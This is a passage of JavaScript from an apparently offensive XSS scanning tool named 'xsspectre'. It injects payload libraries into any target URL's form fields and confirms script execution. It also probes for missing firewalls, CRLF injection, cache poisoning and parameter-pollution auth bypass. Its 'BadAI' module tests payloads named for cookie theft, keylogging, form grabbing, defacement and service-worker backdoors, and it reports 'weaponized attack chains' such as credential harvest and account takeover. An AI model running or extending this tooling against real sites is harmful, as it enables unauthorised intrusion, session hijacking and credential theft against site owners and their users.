    if (/<head[^>]*>/i.test(html)) return html.replace(/<head[^>]*>/i, m => m + HOOK_SCRIPT);
    if (/<html[^>]*>/i.test(html)) return html.replace(/<html[^>]*>/i, m => m + '<head>' + HOOK_SCRIPT + '</head>');
    if (/<!doctype[^>]*>/i.test(html)) return html.replace(/<!doctype[^>]*>/i, m => m + '<html><head>' + HOOK_SCRIPT + '</head><body>') + '</body></html>';
    return '<!DOCTYPE html><html><head>' + HOOK_SCRIPT + '</head><body>' + html + '</body></html>';
  };
  const verifyAlertFired = (fullResponseHtml, waitMs, expectedMessage = null) => {
    return new Promise(resolve => {
      if (typeof document === 'undefined' || !document.body) { resolve({ fired: false, reason: 'no-dom', message: null }); return; }
      let done = false, timer = null, iframe = null;
      const finish = result => {
        if (done) return;
        done = true;
        if (timer) clearTimeout(timer);
        window.removeEventListener('message', onMsg);
        try { if (iframe && iframe.remove) iframe.remove(); } catch {}
        resolve(result);
      };
      const onMsg = ev => {
        if (!ev || !ev.data) return;
        const d = ev.data;
        if (d.__xsspectre === 'ALERT') {
          const msg = d.msg != null ? String(d.msg) : '';
          const matched = expectedMessage == null || msg === '' || msg.includes(expectedMessage);
          finish({ fired: matched, reason: matched ? 'alert-confirmed' : 'alert-unrelated', ts: d.ts || Date.now(), message: msg });
        } else if (d.__xsspectre === 'ERROR') {
          if (!done) { done = true; if (timer) clearTimeout(timer); window.removeEventListener('message', onMsg); try { if (iframe && iframe.remove) iframe.remove(); } catch {} resolve({ fired: false, reason: 'script-error', message: d.msg || null }); }
        }
      };
      window.addEventListener('message', onMsg);
      iframe = document.createElement('iframe');
      iframe.setAttribute('sandbox', 'allow-scripts allow-popups');
      iframe.setAttribute('referrerpolicy', 'no-referrer');
      iframe.style.cssText = 'position:fixed;left:-99999px;top:-99999px;width:2px;height:2px;opacity:0;border:0;pointer-events:none;';
      timer = setTimeout(() => finish({ fired: false, reason: 'timeout', message: null }), waitMs || state.settings.alertWaitMs);
      try { iframe.srcdoc = injectHooksIntoResponse(fullResponseHtml); document.body.appendChild(iframe); }
      catch (e) { finish({ fired: false, reason: 'iframe-attach-failed', message: null }); }
    });
  };
  const extractExpectedAlertArg = payload => {
    const m = payload.match(/alert\s*\(\s*(?:["']([^"']*)["']|(\d+))\s*\)/);
    if (!m) return null;
    if (m[1] !== undefined) return m[1];
    if (m[2] !== undefined) return m[2];
    return null;
  };

  const buildRequest = (targetUrl, form, input, payload) => {
    const base = form.action || targetUrl;
    const method = (form.method || 'GET').toUpperCase();
    const headers = {};
    let url = base, body = null;
    if (form.kind === 'hash') {
      const u = new URL(base, targetUrl);
      const params = new URLSearchParams();
      for (const inp of form.inputs) params.set(inp.name || 'x', inp === input ? payload : (inp.value || ''));
      u.hash = '#' + params.toString();
      url = u.href;
    } else if (method === 'GET') {
      const u = new URL(base, targetUrl);
      for (const inp of form.inputs) {
        const val = inp === input ? payload : (inp.value || '');
        u.searchParams.set(inp.name || 'q', val);
      }
      url = u.href;
    } else {
      const params = new URLSearchParams();
      for (const inp of form.inputs) params.append(inp.name || 'q', inp === input ? payload : (inp.value || ''));
      if ((form.enctype || '').includes('json')) {
        const obj = {};
        for (const inp of form.inputs) obj[inp.name || 'q'] = inp === input ? payload : (inp.value || '');
        body = JSON.stringify(obj);
        headers['Content-Type'] = 'application/json';
      } else {
        body = params.toString();
        headers['Content-Type'] = 'application/x-www-form-urlencoded';
      }
    }
    return { url, method, headers, body };
  };

  const testOne = async (targetUrl, form, input, payloadObj, options = {}) => {
    const req = buildRequest(targetUrl, form, input, payloadObj.payload);
    const timeoutMs = options.timeout || state.settings.timeout;
    const prepared = await prepareNetworkRequest(req.url, {
      method: req.method,
      headers: {
        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        ...(req.headers || {})
      },
      body: req.body || undefined,
      credentials: 'omit',
      redirect: 'follow',
      cache: 'no-store'
    });
    const workerResult = await WorkerPool.run({
      action: 'fetch',
      url: prepared.url,
      options: { ...prepared.options, timeout: timeoutMs },
      payload: payloadObj.payload
    });

    state.runtime.stats.requests++;
    if (workerResult.ok) {
      if (workerResult.status >= 200 && workerResult.status < 500) state.runtime.stats.success++;
      else state.runtime.stats.failures++;
    } else {
      state.runtime.stats.failures++;
    }

    if (!workerResult.ok || !workerResult.reflected) {
      return { form, input, payload: payloadObj, url: req.url, reflected: false, context: null, executable: false, verified: false, verifyReason: null, alertMessage: null, mirror: null, matching: payloadObj.matching === true };
    }

    if (workerResult.html) {
      const mirror = isMirrorResponse(workerResult.html, state.runtime.baseline);
      if (mirror) {
        state.runtime.stats.mirrorFiltered++;
        return { form, input, payload: payloadObj, url: req.url, reflected: false, context: null, executable: false, verified: false, verifyReason: 'baseline-' + mirror, alertMessage: null, mirror, matching: payloadObj.matching === true };
      }
    }

    let verified = false, verifyReason = null, alertMessage = null;
    if (workerResult.reflected && workerResult.executable && workerResult.html && state.settings.confirmAlerts && options.confirmAlerts !== false) {
      const expected = extractExpectedAlertArg(payloadObj.payload);
      const v = await verifyAlertFired(workerResult.html, state.settings.alertWaitMs, expected);
      verified = v.fired;
      verifyReason = v.reason;
      alertMessage = v.message;
      if (v.fired) {
        state.runtime.stats.alertsFired++;
        if (payloadObj.encoding && payloadObj.encoding !== 'none') {
          const c = state.runtime.winningEncodings.get(payloadObj.encoding) || 0;
          state.runtime.winningEncodings.set(payloadObj.encoding, c + 1);
          state.runtime.stats.encodingWins++;
        }
      }
    }
    return {
      form, input, payload: payloadObj, url: req.url,
      reflected: workerResult.reflected,
      context: workerResult.context,
      executable: workerResult.executable,
      verified, verifyReason, alertMessage,
      responseLength: workerResult.html ? workerResult.html.length : 0,
      status: workerResult.status,
      mirror: null,
      matching: payloadObj.matching === true
    };
  };

  const probeFirewallAbsence = async (targetUrl, baselineHtml) => {
    const evidence = [];
    let score = 0;
    const marker = 'XSSPECTRE_FW_PROBE_' + Date.now();
    try {
      const u = new URL(targetUrl);
      u.searchParams.set('xsspectre_probe', marker + '<script>alert(1)</script>');
      const res = await fetchFull(u.href, {}, 1);
      if (res.text.includes(marker)) { evidence.push({ ok: true, text: 'Raw marker + script reflected verbatim — no input filtering' }); score += 25; }
      else evidence.push({ ok: false, text: 'Probe marker was altered or removed' });
      if (res.elapsed < 2500) { evidence.push({ ok: true, text: `Response time ${res.elapsed.toFixed(0)}ms — no rate-limit delay` }); score += 15; }
      else evidence.push({ ok: false, text: `Response took ${res.elapsed.toFixed(0)}ms — rate-limit suspected` });
      const challengeHeaders = ['cf-mitigated','x-sucuri-block','x-iinfo','x-datadome','x-amzn-waf-action','x-waf-protection'];
      const present = challengeHeaders.filter(h => res.headers[h]);
      if (present.length === 0) { evidence.push({ ok: true, text: 'No WAF challenge headers present' }); score += 20; }
      else evidence.push({ ok: false, text: 'WAF challenge headers: ' + present.join(', ') });
      if (res.status >= 200 && res.status < 400) { evidence.push({ ok: true, text: `HTTP ${res.status} — request not blocked` }); score += 15; }
      else evidence.push({ ok: false, text: `HTTP ${res.status} — request may be blocked` });
      const maliciousUA = await fetchFull(targetUrl, { headers: { 'User-Agent': 'sqlmap/1.0' } }, 1);
      if (maliciousUA.status >= 200 && maliciousUA.status < 400) { evidence.push({ ok: true, text: 'Malicious UA (sqlmap) not blocked — no UA-based filtering' }); score += 10; }
      const maliciousOrigin = await fetchFull(targetUrl, { headers: { 'Origin': 'https://evil.example' } }, 1);
      if (maliciousOrigin.status >= 200 && maliciousOrigin.status < 400) { evidence.push({ ok: true, text: 'Suspicious Origin header accepted — no origin validation' }); score += 5; }
    } catch (e) { evidence.push({ ok: false, text: 'Firewall probe failed: ' + e.message }); }
    return { score, evidence, firewallAbsent: score >= 60 };
  };

  const altMethodTiming = async (targetUrl, form, input, payload) => {
    try {
      const req = buildRequest(targetUrl, form, input, payload);
      const t0 = performance.now();
      await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0);
      const t1 = performance.now() - t0;
      const benign = buildRequest(targetUrl, form, input, 'BENIGN_MARKER_' + Date.now());
      const t2 = performance.now();
      await fetchFull(benign.url, { method: benign.method, headers: benign.headers, body: benign.body }, 0);
      const t3 = performance.now() - t2;
      const diff = Math.abs(t1 - t3);
      if (diff > 300) return { hit: true, reason: `Timing delta ${diff.toFixed(0)}ms — divergent parse path` };
      return { hit: false, reason: `Timing delta only ${diff.toFixed(0)}ms` };
    } catch { return { hit: false, reason: 'timing probe failed' }; }
  };
  const altMethodSize = async (targetUrl, form, input, payload) => {
    try {
      const req = buildRequest(targetUrl, form, input, payload);
      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0);
      const benign = buildRequest(targetUrl, form, input, 'BENIGN_XYZ');
      const res2 = await fetchFull(benign.url, { method: benign.method, headers: benign.headers, body: benign.body }, 0);
      const diff = Math.abs(res.text.length - res2.text.length);
      const expected = Math.abs(payload.length - 'BENIGN_XYZ'.length);
      if (diff > expected * 0.7 && diff > 5) return { hit: true, reason: `Size delta ${diff} bytes ≈ injection footprint` };
      return { hit: false, reason: `Size delta ${diff} bytes insufficient` };
    } catch { return { hit: false, reason: 'size probe failed' }; }
  };
  const altMethodHeaderEcho = async (targetUrl, form, input, payload) => {
    try {
      const marker = 'HDR_ECHO_' + Date.now();
      const u = new URL(form.action || targetUrl);
      for (const inp of form.inputs) u.searchParams.set(inp.name, inp === input ? payload : (inp.value || ''));
      const res = await fetchFull(u.href, { headers: { 'X-XSSpectre-Probe': marker } }, 0);
      const echo = Object.keys(res.headers).filter(h => res.headers[h] && res.headers[h].includes(marker));
      if (echo.length > 0) return { hit: true, reason: 'Marker echoed in response header — header-injection surface' };
      return { hit: false, reason: 'No marker echo in response headers' };
    } catch { return { hit: false, reason: 'header probe failed' }; }
  };
  const altMethodHash = async (targetUrl, form, input, payload) => {
    try {
      const req = buildRequest(targetUrl, form, input, payload);
      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0);
      const baseline = buildRequest(targetUrl, form, input, 'NEUTRAL_TOKEN_000');
      const res2 = await fetchFull(baseline.url, { method: baseline.method, headers: baseline.headers, body: baseline.body }, 0);
      const fp = s => { let h = 0; for (let i = 0; i < Math.min(s.length, 4000); i++) h = ((h << 5) - h + s.charCodeAt(i)) | 0; return h; };
      if (fp(res.text) !== fp(res2.text)) return { hit: true, reason: 'Body hash differs — payload influenced render path' };
      return { hit: false, reason: 'Body hash identical to baseline' };
    } catch { return { hit: false, reason: 'hash probe failed' }; }
  };
  const altMethodErrorDelta = async (targetUrl, form, input, payload) => {
    try {
      const malformed = payload + '%00%FF\x00<%';
      const req = buildRequest(targetUrl, form, input, malformed);
      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0);
      const hasServerError = res.status >= 500;
      const hasWarnings = /(warning|error|exception|stack trace|syntax error|uncaught)/i.test(res.text) && res.text.length < 5000;
      if (hasServerError || hasWarnings) return { hit: true, reason: `Server error/warning (HTTP ${res.status}) — payload reached unsanitized parser` };
      return { hit: false, reason: `Server handled malformed input cleanly (HTTP ${res.status})` };
    } catch { return { hit: false, reason: 'error-delta probe failed' }; }
  };
  const altMethodCSPProbe = async (targetUrl, form, input, payload) => {
    try {
      const req = buildRequest(targetUrl, form, input, payload);
      const res = await fetchFull(req.url, { method: req.method, headers: req.headers, body: req.body }, 0);
      const csp = res.headers['content-security-policy'] || '';
      const xssProtection = res.headers['x-xss-protection'] || '';
      const nosniff = res.headers['x-content-type-options'] || '';
      const hsts = res.headers['strict-transport-security'] || '';
      const findings = [];
      if (!csp) findings.push('No CSP header present');
      else if (/unsafe-inline/i.test(csp)) findings.push('CSP contains unsafe-inline');
      if (!xssProtection || /^0$/.test(xssProtection)) findings.push('X-XSS-Protection disabled or missing');
      if (!nosniff) findings.push('X-Content-Type-Options nosniff missing');
      if (!hsts) findings.push('HSTS missing');
      if (findings.length >= 2) return { hit: true, reason: findings.join(' | ') };
      return { hit: false, reason: 'Defense-in-depth headers adequately configured' };
    } catch { return { hit: false, reason: 'CSP probe failed' }; }
  };
  const altMethodCachePoison = async (targetUrl) => {
    try {
      const marker = 'CACHE_PROBE_' + Date.now();
      await fetchFull(targetUrl, { headers: { 'X-Forwarded-Host': marker + '.evil' } }, 0);
      await sleep(150);
      const second = await fetchFull(targetUrl, {}, 0);
      if (second.text.includes(marker)) return { hit: true, reason: 'Cache poisoning: forwarded-host marker persisted' };
      return { hit: false, reason: 'No cache poisoning observed' };
    } catch { return { hit: false, reason: 'cache probe failed' }; }
  };
  const altMethodCRLFProbe = async (targetUrl, form, input) => {
    try {
      const crlfPayload = '%0d%0aX-Injected-Header: ' + Date.now();
      const u = new URL(form.action || targetUrl);
      for (const inp of form.inputs) u.searchParams.set(inp.name, inp === input ? crlfPayload : (inp.value || ''));
      const res = await fetchFull(u.href, {}, 0);
      const injected = Object.keys(res.headers).find(h => h.toLowerCase().startsWith('x-injected'));
      if (injected) return { hit: true, reason: 'CRLF injection: header was injected into response' };
      return { hit: false, reason: 'No CRLF header injection observed' };
    } catch { return { hit: false, reason: 'CRLF probe failed' }; }
  };
  const altMethodAuthBypass = async (targetUrl, form, input, payload) => {
    try {
      const u = new URL(form.action || targetUrl);
      for (const inp of form.inputs) u.searchParams.set(inp.name, inp === input ? payload + '&admin=1&role=admin' : (inp.value || ''));
      const res = await fetchFull(u.href, {}, 0);
      if (/admin|welcome.*admin|role.*admin/i.test(res.text.slice(0, 3000))) return { hit: true, reason: 'Possible auth bypass via parameter pollution' };
      return { hit: false, reason: 'No auth bypass signature observed' };
    } catch { return { hit: false, reason: 'auth bypass probe failed' }; }
  };
  const altMethods = [
    { name: 'Timing-Delta Analysis', fn: altMethodTiming },
    { name: 'Response-Size Differential', fn: altMethodSize },
    { name: 'Header Echo Probe', fn: altMethodHeaderEcho },
    { name: 'Body-Hash Fingerprint Delta', fn: altMethodHash },
    { name: 'Malformed-Input Error Delta', fn: altMethodErrorDelta },
    { name: 'Defense-Header Absence Audit', fn: altMethodCSPProbe },
    { name: 'Cache Poisoning Probe', fn: altMethodCachePoison },
    { name: 'CRLF Injection Probe', fn: altMethodCRLFProbe },
    { name: 'Parameter-Pollution Auth Bypass', fn: altMethodAuthBypass }
  ];

  const SuperAI = {
    deploy: async (targetUrl, forms, limit, surface) => {
      const tasks = [];
      const profile = PROFILES[state.runtime.activeProfile] || PROFILES.low;
      const MAX = profile.maxFormsToTest * 2;
      let skipped = 0;
      outer:
      for (let fi = 0; fi < Math.min(forms.length, limit); fi++) {
        const form = forms[fi];
        for (const input of form.inputs) {
          if (!input.name) continue;
          for (const p of PAYLOAD_LIB) {
            if (tasks.length >= MAX) break outer;
            const req = buildRequest(targetUrl, form, input, p.p);
            const prepared = await prepareNetworkRequest(req.url, {
              method: req.method,
              headers: { ...(req.headers || {}) },
              body: req.body || undefined,
              credentials: 'omit',
              redirect: 'follow',
              cache: 'no-store'
            });
            tasks.push(WorkerPool.run({
              action: 'fetch',
              url: prepared.url,
              options: { ...prepared.options, timeout: state.settings.timeout },
              payload: p.p
            }).then(r => ({ form: form.kind, input: input.name, payload: p.id, cve: null, framework: 'Generic', note: p.note, reflected: !!(r.ok && r.reflected), status: r.status, length: r.length, url: req.url })));
          }
        }
      }
      state.runtime.stats.payloadsSkipped += skipped;
      const raw = await Promise.all(tasks);
      const results = [];
      for (const r of raw) {
        if (r.reflected && r.length > 0) {
          if (isMirrorResponse(null, null)) { /* noop */ }
        }
        results.push(r);
        if (r.reflected) state.runtime.stats.superHits++;
      }
      return results;
    },
    report: superResults => {
      const refl = superResults.filter(r => r.reflected);
      return { total: superResults.length, reflected: refl.length, samples: refl.slice(0, 10) };
    }
  };

  const CVE_AI = {
    deploy: async (targetUrl, forms, limit, surface) => {
      const tasks = [];
      const profile = PROFILES[state.runtime.activeProfile] || PROFILES.low;
      const MAX = profile.maxFormsToTest * 2;
      let skipped = 0;
      outer:
      for (let fi = 0; fi < Math.min(forms.length, limit); fi++) {
        const form = forms[fi];
        for (const input of form.inputs) {
          if (!input.name) continue;
          for (const p of CVE_AI_PAYLOADS) {
            if (!shouldRunCve(p, surface)) { skipped++; continue; }
            if (tasks.length >= MAX) break outer;
            const req = buildRequest(targetUrl, form, input, p.p);
            const prepared = await prepareNetworkRequest(req.url, {
              method: req.method,
              headers: { ...(req.headers || {}) },
              body: req.body || undefined,
              credentials: 'omit',
              redirect: 'follow',
              cache: 'no-store'
            });
            tasks.push(WorkerPool.run({
              action: 'fetch',
              url: prepared.url,
              options: { ...prepared.options, timeout: state.settings.timeout },
              payload: p.p
            }).then(r => ({ form: form.kind, input: input.name, payload: p.id, cve: p.cve, framework: p.framework, note: p.note, reflected: !!(r.ok && r.reflected), status: r.status, length: r.length, url: req.url })));
          }
        }
      }
      state.runtime.stats.payloadsSkipped += skipped;
      const results = await Promise.all(tasks);
      for (const r of results) if (r.reflected) state.runtime.stats.cveHits++;
      return results;
    },
    report: cveResults => {
      const refl = cveResults.filter(r => r.reflected);
      return { total: cveResults.length, reflected: refl.length, samples: refl.slice(0, 10) };
    }
  };

  const BadAI = {
    deploy: async (targetUrl, forms, limit, surface) => {
      const tasks = [];
      const profile = PROFILES[state.runtime.activeProfile] || PROFILES.low;
      const MAX = profile.maxFormsToTest * 2;
      let skipped = 0;
      outer:
      for (let fi = 0; fi < Math.min(forms.length, limit); fi++) {
        const form = forms[fi];
        for (const input of form.inputs) {
          if (!input.name) continue;
          for (const p of BAD_AI_PAYLOADS) {
            if (!shouldRunPayload(p, surface)) { skipped++; continue; }
            if (tasks.length >= MAX) break outer;
            const req = buildRequest(targetUrl, form, input, p.p);
            const prepared = await prepareNetworkRequest(req.url, {
              method: req.method,
              headers: { ...(req.headers || {}) },
              body: req.body || undefined,
              credentials: 'omit',
              redirect: 'follow',
              cache: 'no-store'
            });
            tasks.push(WorkerPool.run({
              action: 'fetch',
              url: prepared.url,
              options: { ...prepared.options, timeout: state.settings.timeout },
              payload: p.p
            }).then(r => ({ form: form.kind, input: input.name, payload: p.id, note: p.note, reflected: !!(r.ok && r.reflected), status: r.status, length: r.length, url: req.url })));
          }
        }
      }
      state.runtime.stats.payloadsSkipped += skipped;
      const results = await Promise.all(tasks);
      for (const r of results) if (r.reflected) state.runtime.stats.badHits++;
      return results;
    },
    chainAttack: badResults => {
      const reflected = badResults.filter(r => r.reflected);
      const chains = [];
      if (reflected.some(r => r.payload === 'bad-cookie') && reflected.some(r => r.payload === 'bad-beacon')) chains.push({ name: 'Cookie Theft Chain', detail: 'fetch primary + sendBeacon backup' });
      if (reflected.some(r => r.payload === 'bad-keylog') && reflected.some(r => r.payload === 'bad-form-grab')) chains.push({ name: 'Full Credential Harvest', detail: 'Keystroke + form scrape' });
      if (reflected.some(r => r.payload === 'bad-deface') && reflected.some(r => r.payload === 'bad-redirect')) chains.push({ name: 'Phishing Takeover', detail: 'Deface + redirect' });
      if (reflected.some(r => r.payload === 'bad-iframe-inject') && reflected.some(r => r.payload === 'bad-history')) chains.push({ name: 'Clickjacking + URL Spoof', detail: 'Overlay + URL spoof' });
      if (reflected.some(r => r.payload === 'bad-storage') || reflected.some(r => r.payload === 'bad-session-hijack')) chains.push({ name: 'Client-Side Persistence', detail: 'localStorage drain' });
      if (reflected.some(r => r.payload === 'bad-service-worker-backdoor')) chains.push({ name: 'PERSISTENT BACKDOOR', detail: 'Service Worker registration' });
      if (reflected.some(r => r.payload === 'bad-csrf-chain') || reflected.some(r => r.payload === 'bad-admin-action')) chains.push({ name: 'Account Takeover Chain', detail: 'CSRF + admin action' });
      return chains;
    },
    report: (badResults, chains) => {
      const refl = badResults.filter(r => r.reflected);
      return { total: badResults.length, reflected: refl.length, samples: refl.slice(0, 10), chains };
    }
  };

  const computeSeverity = (verified, executable, reflected, domFindings, wafs, altHits, badRefl, superHits, cveHits, fwAbsent) => {
    if (verified > 0) return 'CRITICAL';
    if (altHits > 0 && fwAbsent) return 'CRITICAL';
    if (superHits > 0 || cveHits > 0) return 'HIGH';
    if (badRefl > 0 && fwAbsent) return 'HIGH';
    if (executable > 0) return 'HIGH';
    if (altHits > 0) return 'HIGH';
    if (reflected > 0 || badRefl > 0) return 'MEDIUM';
    if (domFindings.length > 0) return 'MEDIUM';
    if (wafs.length > 0) return 'LOW';
    return 'INFO';
  };

  const renderFinalReport = (add, data, stats, probe, altSummary, badReport, superReport, cveReport) => {
    const reflected = data.results.filter(r => r.reflected);
    const verified = reflected.filter(r => r.verified);
    const totalAltHits = altSummary.reduce((a, b) => a + b.hits, 0);
    const badRefl = badReport.reflected;
    const superRefl = superReport.reflected;
    const cveRefl = cveReport.reflected;
    const sev = computeSeverity(verified.length, reflected.filter(r => r.executable).length, reflected.length, data.domSinks, data.wafs, totalAltHits, badRefl, superRefl, cveRefl, probe.firewallAbsent);
    const elapsed = ((Date.now() - state.runtime.startedAt) / 1000).toFixed(2);
    const profile = PROFILES[state.runtime.activeProfile] || PROFILES.low;

    const successFindings = [];

    if (verified.length > 0) {
      verified.forEach(r => {
        successFindings.push({
          severity: 'CRITICAL',
          input: r.input.name,
          form: r.form.kind,
          url: r.url,
          payload: r.payload.payload,
          encoding: r.payload.encoding || 'none',
          context: r.context,
          confirmed: true,
          reason: 'Browser alert executed inside sandboxed iframe'
        });
      });
    }
    reflected.filter(r => !r.verified && r.executable).forEach(r => {
      successFindings.push({
        severity: sev === 'CRITICAL' ? 'HIGH' : 'MEDIUM',
        input: r.input.name,
        form: r.form.kind,
        url: r.url,
        payload: r.payload.payload,
        encoding: r.payload.encoding || 'none',
        context: r.context,
        confirmed: false,
        reason: 'Executable reflection (verification pending)'
      });
    });
    superReport.samples.forEach(s => {
      successFindings.push({
        severity: 'MEDIUM',
        input: s.input,
        form: s.form,
        url: s.url,
        payload: s.payload,
        encoding: 'none',
        context: null,
        confirmed: false,
        reason: 'SuperAI context-aware reflection: ' + s.note
      });
    });
    cveReport.samples.forEach(s => {
      successFindings.push({
        severity: 'MEDIUM',
        input: s.input,
        form: s.form,
        url: s.url,
        payload: s.payload,
        encoding: 'none',
        context: null,
        confirmed: false,
        reason: `[${s.cve}] ${s.framework} — ${s.note}`
      });
    });
    badReport.samples.forEach(s => {
      successFindings.push({
        severity: 'HIGH',
        input: s.input,
        form: s.form,
        url: s.url,
        payload: s.payload,
        encoding: 'none',
        context: null,
        confirmed: false,
        reason: 'Destructive reflection: ' + s.note
      });
    });

    add('');
    add('==============================================================', 'pink');
    add('  xsspectre — SCAN REPORT', 'pink');
    add('==============================================================', 'pink');

    if (successFindings.length === 0) {
      add('');
      add('  NO SUCCESSFUL FINDINGS', 'success');
      add('');
      add(`  Target        : ${data.target}`, 'muted');
      add(`  Profile       : ${profile.label}`, 'muted');
      add(`  Requests      : ${stats.requests}`, 'muted');
      add(`  Mirrors cut   : ${stats.mirrorFiltered}`, 'muted');
      add(`  Elapsed       : ${elapsed}s`, 'muted');
      add(`  WAF signals   : ${data.wafs.length ? data.wafs.join(', ') : 'none'}`, 'muted');
      add(`  Firewall score: ${probe.score}/100`, 'muted');
      add(`  Severity      : ${sev}`, sev === 'INFO' ? 'success' : 'muted');
      add('');
      add('  Target appears to resist all tested payload classes.', 'success');
      return successFindings;
    }

    add('');
    add(`  CONFIRMED FINDINGS: ${successFindings.length}`, 'danger');
    add(`  Target        : ${data.target}`, 'accent');
    add(`  Profile       : ${profile.label}`, 'accent');
    add(`  Severity      : ${sev}`, 'danger');
    add(`  Elapsed       : ${elapsed}s`, 'muted');
    add(`  Workers (fin) : ${DynamicWorkerAI.current}`, 'muted');
    add(`  Requests      : ${stats.requests}`, 'muted');
    add(`  Mirrors cut   : ${stats.mirrorFiltered} (false positives eliminated)`, stats.mirrorFiltered > 0 ? 'success' : 'muted');
    add(`  Confirmed alerts: ${stats.alertsFired}`, stats.alertsFired > 0 ? 'danger' : 'muted');
    add(`  WAF signals   : ${data.wafs.length ? data.wafs.join(', ') : 'none'}`, 'muted');
    add(`  Firewall score: ${probe.score}/100 ${probe.firewallAbsent ? '(ABSENT)' : ''}`, probe.firewallAbsent ? 'danger' : 'muted');
    if (state.runtime.winningEncodings.size > 0) {
      const sorted = Array.from(state.runtime.winningEncodings.entries()).sort((a, b) => b[1] - a[1]);
      add(`  Winning encoder: ${sorted[0][0]} (${sorted[0][1]}x)`, 'accent');
    }
    add('');

    add('  --- VULNERABLE PARAMETERS ---', 'danger');
    const seenKeys = new Set();
    successFindings.forEach((f, i) => {
      const key = `${f.form}::${f.input}`;
      if (seenKeys.has(key)) return;
      seenKeys.add(key);
      add(`  [${f.severity}] ${f.form} -> input "${f.input}"`, 'danger');
      add(`         URL     : ${f.url}`, 'muted');
      add(`         Payload : ${f.payload.slice(0, 140)}`, 'muted');
      add(`         Context : ${f.context || 'n/a'}`, 'muted');
      add(`         Encoding: ${f.encoding}`, 'muted');
      add(`         Verified: ${f.confirmed ? 'YES (alert fired)' : 'no'}`, f.confirmed ? 'danger' : 'muted');
      add(`         Reason  : ${f.reason}`, 'muted');
    });
    add('');

    if (badReport.chains.length > 0) {
      add('  --- WEAPONIZED ATTACK CHAINS ---', 'danger');
      badReport.chains.forEach(c => {
        add(`  ${c.name}`, 'danger');
        add(`     ${c.detail}`, 'muted');
      });
      add('');
    }

    if (totalAltHits > 0) {
      add('  --- ALTERNATIVE DETECTION SIGNALS ---', 'warning');
      altSummary.forEach(s => {
        if (s.hits > 0) add(`  [HIT] ${s.method} (${s.hits}/${s.total}): ${s.detail || ''}`, 'warning');
      });
      add('');
    }

    add('  END OF REPORT', 'pink');
    return successFindings;
  };

  const scanTarget = async (target, cmdName = 'scan') => {
    const profileName = cmdName === 'lowscan' ? 'low' : 'high';
    applyProfile(profileName);

    const { add, flushAll, finish } = makeStream();
    const profile = PROFILES[profileName];

    add('');
    add(`Scan Started... (${profile.label})`, 'accent');
    add('');
    await flushAll();

    state.runtime.startedAt = Date.now();
    state.runtime.winningEncodings = new Map();
    state.runtime.stats.payloadsSkipped = 0;
    state.runtime.stats.mirrorFiltered = 0;
    state.runtime.stats.alertsFired = 0;
    state.runtime.stats.reflected = 0;
    state.runtime.stats.verified = 0;
    WorkerPool.init(profile.concurrent);
    DynamicWorkerAI.reset();

    add('==============================================================', 'pink');
    add(`  xsspectre — UNIFIED XSS SCANNER [${profile.label}]`, 'pink');
    add('==============================================================', 'pink');
    add(`Target: ${target}`, 'muted');

    add('Phase 1: Target Normalization');
    let normalized;
    try {
      normalized = normalizeTarget(target);
      add('  -> Normalized: ' + normalized, 'success');
    } catch (e) {
      add('  -> Failed: ' + e.message, 'danger');
      add('Scan aborted.', 'danger');
      return finish();
    }
    state.runtime.visited.add(normalized);

    add('Phase 2: Central Network Service');
    add('  -> FreeUserProxy API is active; networking is centrally managed.', 'success');

    add('Phase 3: Baseline Fingerprinting (root + random 404)');
    const baseline = await buildBaseline(normalized, state.settings.timeout);
    state.runtime.baseline = baseline;
    if (baseline.rootHash !== null) add(`  -> Root  hash: ${baseline.rootHash.toString(16)} len=${baseline.rootLen}`, 'muted');
    else add('  -> Root page unavailable for baseline', 'muted');
    if (baseline.nfHash !== null) add(`  -> 404   hash: ${baseline.nfHash.toString(16)} len=${baseline.nfLen}`, 'muted');
    else add('  -> 404 baseline unavailable (CORS/network)', 'muted');
    add('  -> Mirrors matching baseline will be dropped as false positives.', 'success');

    add('Phase 4: Reconnaissance & Fingerprinting');
    let wafs = [];
    let headersRaw = null;
    try {
      const res = await fetchHeaders(normalized, { method: 'HEAD' }, 1);
      wafs = await detectWAF(res.headers);
      headersRaw = res.headers;
    } catch { add('  -> HEAD failed, continuing with GET probe', 'muted'); }
    add('  -> WAF: ' + (wafs.length ? wafs.join(', ') : 'none'), wafs.length ? 'danger' : 'success');

    add('Phase 5: Page Fetch & Asset Extraction');
    let html;
    try {
      html = await fetchText(normalized, {}, state.settings.retries, true);
      add('  -> Page size: ' + html.length + ' bytes', 'success');
    } catch (e) {
      add('  -> Fetch failed: ' + e.message, 'danger');
      add('Scan aborted.', 'danger');
      return finish();
    }
    const tech = await detectTech(html, headersRaw);
    add('  -> Tech: ' + (tech.length ? tech.join(', ') : 'unknown'), 'muted');

    add('Phase 6: Firewall-Absence Proof');
    const probe = await probeFirewallAbsence(normalized, html);
    add(`  -> Firewall score: ${probe.score}/100 — ${probe.firewallAbsent ? 'ABSENT (exploitable)' : 'partial'}`, probe.firewallAbsent ? 'success' : 'warning');
    if (probe.firewallAbsent) state.runtime.stats.firewallAbsent = 1;

    add('Phase 7: Input Surface Discovery');
    const urlParams = detectUrlParams(normalized);
    const discoveredParams = discoverAllParams(html, normalized);
    state.runtime.stats.paramsFound = discoveredParams.length;
    const forms = detectAllForms(html, normalized, urlParams, discoveredParams);
    state.runtime.stats.forms = forms.length;
    add('  Forms / input groups: ' + forms.length, 'accent');
    add('  Params discovered: ' + discoveredParams.length, discoveredParams.length > 0 ? 'warning' : 'muted');

    add('Phase 8: DOM Source -> Sink Analysis');
    const domSinks = await detectDomSinks(html);
    state.runtime.stats.domSinks = domSinks.length;
    add('  DOM sinks: ' + (domSinks.length || 'none'), domSinks.length ? 'warning' : 'success');

    const surface = analyzeSurface(forms, domSinks, urlParams, discoveredParams, tech);
    state.runtime.surface = surface;

    if (!surface.anyExploitable) {
      add('No exploitable surface detected. Smart-abort: halting.', 'warning');
      const emptyAlt = [];
      const badR = { total: 0, reflected: 0, samples: [], chains: [] };
      const supR = { total: 0, reflected: 0, samples: [] };
      const cveR = { total: 0, reflected: 0, samples: [] };
      const reportData = { target: normalized, forms, results: [], payloads: [], wafs, domSinks, tech };
      renderFinalReport(add, reportData, state.runtime.stats, probe, emptyAlt, badR, supR, cveR);
      return finish();
    }

